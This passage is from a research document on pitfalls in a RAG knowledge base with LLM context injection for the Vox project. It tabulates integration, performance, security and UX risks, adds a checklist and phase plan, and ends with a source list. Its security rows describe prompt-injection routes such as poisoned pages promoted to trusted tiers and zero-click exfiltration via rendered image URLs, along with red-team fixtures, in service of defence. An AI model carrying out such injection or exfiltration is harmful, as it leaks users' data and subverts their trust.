| Fenced `vox` doctests | The LLM rewrite edits or reflows code fences, so the doctest gate fails or, worse, gains a `// vox:skip` | The rewrite tool never touches fences. Lint fails if a rewrite PR adds `vox:skip`. |
| Astro sidebar (`category` frontmatter) | Taxonomy migration renames `category` values, reshuffling the public docs nav | Keep `category` (nav) separate from the new KB facets. Migrate `category` only by deliberate PR. |
| MENS corpus (`training_eligible`) | Assuming the summary block is fine to train on | The builder strips summary blocks and filters by `authorship`/`origin` |
| `vox_actor_runtime::llm` facade | The rewrite or re-verify tool calls a provider directly "for batch speed" | All LLM calls go through the facade (the `llm_provider_call` detector will fail otherwise). Judge model selection goes through the registry, which also enforces judge ≠ generator family. |
| OpenRouter prompt caching | RAG context injected above or into the system prompt, which invalidates the cached prefix on every turn | Static-first: system prompt and tool schemas, then retrieved context, then the user turn. Test that the prefix bytes are stable across turns. |
| `KbStore` / `KbRouter` (existing) | Building a parallel store for the curated library | Extend `KbEntrySource` with a tier and reuse the store. Do not fork. |
| SSOT autoregen bot | Its commits bump git dates on generated reference pages | Freshness comes from `verified_at`, not git (Pitfall 6) |
| Model registry | Hardcoding cutoffs or budgets per model in injection code | Budgets and cutoffs live as registry fields. The no-pinned-models policy means they must come from live registry data with a conservative default. |

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Re-embedding the whole corpus on every commit | Slow pre-push or doctor, battery drain | Content-hash keyed incremental reindex | Immediately at about 700 docs × chunks on a laptop under load |
| Per-turn CRAG web fallback on low-confidence retrieval | Chat latency spikes, Tavily/SearXNG rate limits (the governor already caps at 2-5 concurrent) | Trigger web fallback only on an explicit insufficiency verdict plus a user or policy opt-in. Cache per query. | Under any parallel-agent load |
| LLM summary-card generation for all chunks at index time | Hours of tokens and cost | Cards per doc or section, not per chunk. Regenerate only on content-hash change. | At the first full rebuild |
| Unbounded nightly re-verification | Token spend grows with the corpus (OWASP LLM10) | A per-run page and token budget with a priority queue (expired first, high-traffic first) | Once more than about 100 pages expire in one window |
| Nightly generation evals with n=3 runs times every registered model | Nightly job exceeds the 180-minute cap | Sample models per night (round-robin) and keep a small fixed set for trend | As the registry grows past about 5 models |

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Treating "human merged the promotion PR" as verified | Poisoned content in the top trust tier and in MENS training | Separate `human_attested_by`, forced `training_eligible: false` for web-promoted pages (Pitfall 2) |
| Sanitizing only at fetch time | Legacy and R1 rows, plus future ingest paths, bypass it | Sanitize at injection too (defense in depth). The type system forces a tier on every write. |
| Relying on a "prompt-injection classifier" as the defense | 95% detection is a failing grade (Willison). Attackers iterate. | Architectural containment: tool gating when untrusted tiers are in context, quarantined summarization, spotlighting. Treat a classifier as a signal only. |
| Storing full scraped pages in a public FOSS git repo | Copyright redistribution, robots/AI-licensing violations | The inbox (DB, local) holds excerpts plus URL plus hash. Promoted pages paraphrase with attribution. Lint caps the verbatim-quote length from any `sources[]` entry. |
| Trusting SEO-optimized results as sources | Affiliate spam dominates top results (29% of Google front pages had affiliate links vs a 2% web baseline — Bevendorff et al., ECIR 2024) | Domain allow/deny lists, corroboration from at least 2 distinct domains for promotion (`corroboration.rs`), academic or primary-source preference (`trust.rs`) |
| Markdown image or link rendering of injected content in the GUI | Zero-click exfiltration via image URL when the GUI renders model output | The GUI does not auto-load remote images in assistant output or Inspector views. Links are allowlisted or click-to-reveal. |

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Opaque context: users cannot see what was injected | Cannot debug wrong answers. Blame the model instead of a stale doc. | The Inspector shows the **exact payload items** sent for the turn: tier badge, source, score, why selected, token count, `verified_at`. "Nothing injected" is shown explicitly. |
| Citations shown but never checked (<25% hover or click rates) | False confidence. Fluent presentation reads as evidence. | Mark unverified or stale citations visibly. Do not make uncited answers look *more* confident than cited ones. |
| Too many knobs (k, floor, weights, budgets per model, tiers, web toggle…) | Users mistune, results become unreproducible, and bug reports cannot be reproduced | Expose about 3 knobs (KB on/off, web fallback on/off, "strict sources only"). Everything else stays in config or advanced. The Inspector shows the effective values. |
| The Inbox as an unbounded firehose | Review fatigue leads to rubber-stamping (Pitfall 2) | Rank the inbox by value (query frequency, corroboration). Auto-expire unreviewed items after N days. Show the source excerpt beside each claim. |
| The Library shows superseded or expired pages identically to current ones | Users read and cite dead docs | Superseded and expired badges, with a link to the successor |

## "Looks Done But Isn't" Checklist

- [ ] **Inbox shipped:** verify that `persist_web_hits` no longer writes `curated`-reachable rows (R1). A grep finds no tier-less `persist_text_document_chunk` callers.
- [ ] **Spotlighting shipped:** verify that the red-team fixture ASR was *measured* per model family, not assumed from the paper.
- [ ] **Rewrite batch merged:** verify `authorship` is set on every rewritten page, that the MENS builder excludes summary blocks (corpus-builder test), and that no new `vox:skip` was added.
- [ ] **Retrieval eval green:** verify it is computed on **IDs** and is not R4's word-overlap helpers, and that the golden set is outside the index root (canary scan).
- [ ] **Per-model budgets:** verify the property test runs over the *live registry*, not a hardcoded list, and that the empty-injection path exists.
- [ ] **Cutoff-aware ranking:** verify it uses `verified_at`, not git mtime (whitespace-commit fixture), and is a no-op for `vox-internal`.
- [ ] **Staleness:** verify `review_by` dates are jittered and that `verified_at` cannot advance without evidence.
- [ ] **GUI Inspector:** verify via Playwright that the displayed item count equals the backend payload item count (mock IPC), and that tier badges render for every tier.
- [ ] **Promotion PR:** verify that the generated body contains source excerpts per claim and that the lint forces `training_eligible: false`.
- [ ] **R2 floor removed:** verify that agent-derived entries never outrank curated content at equal similarity.

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Rewrites landed without `authorship` | HIGH | Diff each page against its pre-rewrite git blob, stamp `authorship` by commit author/trailer, and rebuild the MENS corpus. Retrain if a run already consumed it. |
| Poisoned page promoted | MEDIUM | Revert the page, add the source domain to the denylist, purge index rows by `sources[].sha256`, and check whether a MENS run consumed it (training manifest). Add a red-team fixture for the pattern. |
| Mixed-embedding index | LOW | Drop and rebuild from the manifest (content-hash keyed). Blue/green next time. |
| Taxonomy sprawl | MEDIUM | Alias map in the SSOT, then a scripted rename PR (`.vox` script), then lint lock |
| Judge-biased eval baselines | MEDIUM | Re-score with a cross-family, swap-checked judge and reset the baselines in a single reviewed PR |
| Review-date avalanche | LOW | Re-jitter `review_by` with a scripted PR. Demote, do not delete. |

## Pitfall-to-Phase Mapping

Suggested ordering. Phase names are descriptive because the roadmap does not exist yet.

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| 8 Eval harness | **P1 Eval baseline (first)** | Deterministic ID-based retrieval eval and ratchet file. Golden set outside the index. R4 renamed or removed. |
| 1 Injection (R1, R3), 13 leakage | **P2 Provenance and trust tiers** (fence R1 here) | Tier is required on every write. Sanitizer property test. Fake-key egress fixture. |
| 3 Self-consuming loop (R2, R6) | P2 (authorship field), enforced in P4 | Corpus-builder exclusion test. R2 floor removed. |
| 9 Taxonomy, 10 duplicates (fields), 6 scope/verified_at fields | **P3 Taxonomy and schema lint** | Vocabulary SSOT. Lint blocks changed files and ratchets the backlog. |
| 4 Rewrite meaning loss | **P4 Page-one rewrites** (guard tool first) | Identifier and negation guard. Summary-distinctiveness ratchet. |
| 12 Index drift, 10 dedup | **P5 Chunk and card indexing** | Manifest version test. Delete/rename integration test. |
| 5 Dilution, 6 cutoff ranking, 7 citations, caching order | **P6 Context injection** | Budget property test over the registry. Empty-injection path. Distractor and KB-on/off nightly evals. |
| 1 (inbox side), 2 Laundering, copyright and SEO | **P7 CRAG fallback, inbox, promotion** | Red-team ASR nightly. Promotion lint. Fail-closed trust. |
| 11 Staleness | **P8 Staleness and re-verification** | Evidence-required type. Jitter distribution check. |
| UX: opacity, knobs, citations | **P9 GUI Library/Inbox/Inspector** | Playwright: payload count parity, tier badges, unverified-citation badge, no remote image auto-load |

**Ordering rationale:**
- Measure before changing (P1).
- Record provenance before generating any LLM text (P2 before P4). This is non-recoverable if reversed.
- Fence the existing unreviewed web path (R1) before adding *more* web paths (P7).
- Injection (P6) needs indexed cards (P5) and the trust tiers (P2).
- The GUI comes last but must be designed against the P6 payload schema so the Inspector shows the real payload.

**Research flags (phases needing deeper research):**
- P6: the per-model budget heuristic and calibrated relevance floor. RRF scores are not calibrated, so this needs empirical work on this corpus.
- P7: the copyright posture for a public FOSS repo (legal, not technical).
- P4: the faithfulness-judge choice under the no-pinned-models policy.

## Sources

| Source | URL | Confidence | Used for |
|--------|-----|------------|----------|
| Repo code (read directly 2026-10-03): `vox-search/src/{execution,policy,evaluation,trust,ingest,corroboration}.rs`, `vox-orchestrator-mcp/src/{chat_tools/chat/message.rs,kb_tools/signal_research.rs,kb_tools/signal_chat.rs}`, `vox-orchestrator/src/knowledge_base/types.rs`, `vox-doc-pipeline/src/pipeline/lint.rs`, `vox-gamify/src/quest/templates.rs` | local | HIGH | R1-R7, integration gotchas |
| Liu et al., "Lost in the Middle" (TACL 2024) | https://arxiv.org/abs/2307.03172 | MEDIUM | P5 |
| Hsieh et al., "Found in the Middle" (2024) | https://arxiv.org/html/2406.16008v2 | MEDIUM | P5 (cause: attention bias) |
| Chroma, "Context Rot" (2025-07-14) | https://www.trychroma.com/research/context-rot | MEDIUM | P5 (fetched directly) |
| Cuconasu et al., "The Power of Noise" (SIGIR 2024) | https://arxiv.org/pdf/2401.14887 | MEDIUM | P5, P10 |
| Joren et al., "Sufficient Context" (Google, ICLR 2025) | https://ar5iv.labs.arxiv.org/html/2411.06037 | MEDIUM | P5 (abstention) |
| Wu et al., "ClashEval" (NeurIPS 2024) | https://arxiv.org/abs/2404.10198 | MEDIUM | P6 |
| Ouyang et al., "HoH: outdated information harms RAG" (ACL 2025) | https://arxiv.org/html/2503.04800v1 | MEDIUM | P6 |
| Cheng et al., "Dated Data: Tracing Knowledge Cutoffs" (COLM 2024) | https://arxiv.org/abs/2403.12958 | MEDIUM | P6 |
| Liu, Zhang, Liang, "Evaluating Verifiability in Generative Search Engines" (EMNLP Findings 2023) | https://arxiv.org/abs/2304.09848 | MEDIUM | P7 |
| "Analyzing the Presentation, Content, and Utilization of References in LLM-powered Conversational AI" (2026) | https://arxiv.org/pdf/2604.15326 | LOW | P7/UX (<25% verification) |
| Greshake et al., "Not what you've signed up for" (AISec 2023) | https://arxiv.org/abs/2302.12173 | MEDIUM | P1 |
| Hines et al., "Spotlighting" (Microsoft 2024) | https://arxiv.org/html/2403.14720v1 | MEDIUM | P1 |
| Beurer-Kellner et al., "Design Patterns for Securing LLM Agents against Prompt Injections" (2025) | https://arxiv.org/pdf/2506.08837 | MEDIUM | P1 containment |
| Willison, "The lethal trifecta" (2025-06-16) | https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/ | MEDIUM | P1, Security (fetched directly) |
| Debenedetti et al., "AgentDojo" (NeurIPS 2024) | https://arxiv.org/pdf/2406.13352v2 | MEDIUM | P1 red-team fixture design |
| promptfoo, ASCII smuggling red-team plugin; Microsoft Security blog on ASCII smuggling (2026-09-03) | https://promptfoo.dev/docs/red-team/plugins/ascii-smuggling/ ; https://microsoft.com/en-us/security/blog/2026/09/03/ascii-smuggling-crosses-over-from-ai-prompt-injection-to-phishing-evasion | LOW | P1 sanitizer ranges |
| Zou et al., "PoisonedRAG" (USENIX Security 2025) | https://arxiv.org/abs/2402.07867 | MEDIUM | P2 |
| OWASP Top 10 for LLM Applications 2025 (LLM01/02/04/08/09/10) | https://genai.owasp.org/llmrisk/llm082025-vector-and-embedding-weaknesses/ | MEDIUM | P1, P2, P13, Performance (fetched directly) |
| Shumailov et al., "AI models collapse when trained on recursively generated data" (Nature 2024) | https://oatml.cs.ox.ac.uk/publications/202407_Shumailov_ModelCollapse.html | MEDIUM | P3 |
| Gerstgrasser et al., "Is Model Collapse Inevitable?" (ICML 2024) | https://arxiv.org/abs/2404.01413v1 | MEDIUM | P3 (accumulate, don't replace) |
| Alemohammad et al., "Self-Consuming Generative Models Go MAD" (ICLR 2024) | https://arxiv.org/abs/2307.01850v1 | MEDIUM | P3 |
| Dai et al., "Neural Retrievers are Biased Towards LLM-Generated Content" (KDD 2024) | https://arxiv.org/abs/2310.20501v3 | MEDIUM | P3 source bias |
| Sourati, Dehghani et al., "AI writing assistants shrink linguistic diversity" (Nature Human Behaviour 2026) | https://www.nature.com/articles/s41562-026-02549-7 | MEDIUM | P4 |
| Kim et al., "FABLES" (2024); Subbiah et al., "StorySumm" (2024) | https://arxiv.org/abs/2404.01261v2 ; https://arxiv.org/html/2407.06501v3 | MEDIUM | P4 |
| Zheng et al., "Judging LLM-as-a-Judge with MT-Bench" (NeurIPS 2023) | https://arxiv.org/pdf/2306.05685 | MEDIUM | P8 |
| Panickssery et al., "LLM Evaluators Recognize and Favor Their Own Generations" (NeurIPS 2024) | https://arxiv.org/abs/2404.13076v1 | MEDIUM | P8, P11 |
| "On Randomness in Agentic Evals" (2026); "The Good, The Bad, and The Greedy" (2024) | https://arxiv.org/pdf/2602.07150 ; https://arxiv.org/pdf/2407.10457 | MEDIUM | P8 non-determinism |
| Deng et al., "Investigating Data Contamination in Modern Benchmarks" (NAACL 2024) | https://arxiv.org/html/2311.09783v2 | MEDIUM | P8 leakage |
| Barnett et al., "Seven Failure Points When Engineering a RAG System" (CAIN 2024) | https://arxiv.org/abs/2401.05856v1 | MEDIUM | General: validation only feasible in operation |
| Azam, "Evaluate Your Own RAG: Why Best Practices Failed Us" (HF blog, 2025-11-05) | https://huggingface.co/blog/charles-azam/rag | LOW | P8 (benchmark on your own corpus; fetched directly) |
| Anthropic, "Contextual Retrieval" (2024) | https://www.anthropic.com/news/contextual-retrieval | MEDIUM | P5/P12 card design context |
| Bevendorff et al., "Is Google Getting Worse?" (ECIR 2024) | https://gwern.net/doc/technology/google/2024-bevendorff.pdf | MEDIUM | Security (SEO spam) |
| Embedding rotation as a database migration (practitioner, 2026) | https://tianpan.co/blog/2026-04-23-embedding-rotation-database-migration-not-deploy | LOW | P12 |
| MinHash near-dup thresholds (practitioner) | https://www.geosurge.ai/corpus/gen-4163/data-deduplication/deduplication-strategies-for-rag-corpora-exact-match-fuzzy-and-embedding-based-approaches.html | LOW | P10 |
| Google documentation freshness dates (Software Engineering at Google, quoted) | https://www.goodreads.com/quotes/11341657-at-google-we-often-attach-freshness-dates-to-documentation-such | LOW | P11 |
| Controlled vocabulary drift (PKM practitioner) | https://notes.dsebastien.net/10+Meta/99+AI+Assistant/Wikis/PKM/AI+Wiki+-+PKM+-+Controlled+Vocabulary | LOW | P9 |
| OpenRouter prompt caching guide (static-first) | https://aireiter.com/blog/openrouter-prompt-caching-guide | LOW | Integration (caching order) |
| Ropes & Gray, "Web Scraping in the Age of AI" (2026-05) | https://www.ropesgray.com/en/insights/alerts/2026/05/web-scraping-in-the-age-of-ai-guidance-for-data-owners-and-scrapers | LOW | Security (copyright); needs legal review |

---
*Pitfalls research for: Vox Knowledge Base (milestone v1.1, workstream `kb`)*
*Researched: 2026-10-03*
